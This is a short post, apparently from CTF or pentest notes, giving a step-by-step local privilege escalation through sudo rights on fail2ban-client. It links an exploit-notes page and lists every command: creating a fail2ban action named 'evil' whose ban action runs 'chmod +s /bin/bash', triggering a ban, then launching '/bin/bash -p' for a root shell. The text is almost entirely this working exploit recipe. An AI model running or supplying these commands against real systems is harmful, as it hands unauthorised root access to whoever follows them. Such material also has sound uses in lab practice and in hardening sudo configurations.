If you have sudo permission on fail2ban-client just follow this
<https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-client-privilege-escalation/>

Substitute sshd for something else you get from first command if you don't have it as an option.
`sudo /usr/bin/fail2ban-client status`
`sudo /usr/bin/fail2ban-client get sshd actions`
`sudo /usr/bin/fail2ban-client set sshd addaction evil`
`sudo /usr/bin/fail2ban-client set sshd action evil actionban "chmod +s /bin/bash"`
`sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.5`
`/bin/bash -p`